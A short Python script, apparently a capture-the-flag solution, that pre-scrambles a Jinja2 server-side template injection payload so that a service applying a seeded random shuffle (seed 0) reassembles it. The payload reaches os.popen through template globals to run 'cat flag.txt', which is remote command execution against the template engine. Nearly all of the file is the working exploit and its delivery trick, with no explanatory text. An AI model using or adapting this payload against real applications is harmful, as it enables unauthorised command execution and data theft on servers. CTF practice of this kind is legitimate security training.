import random


text1="{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

text=[i for i in range(len(text1))]
random.seed(0)
jumbled = list(text)
random.shuffle(jumbled)
# jumbled = ''.join(jumbled)
print(jumbled)

newl=[0]*len(text1)
for i in range(len(text1)):
    newl[jumbled[i]]=text1[i]
print(''.join(newl))

random.seed(0)
jumbled = list(newl)
random.shuffle(jumbled)
# jumbled = ''.join(jumbled)
print(''.join(jumbled))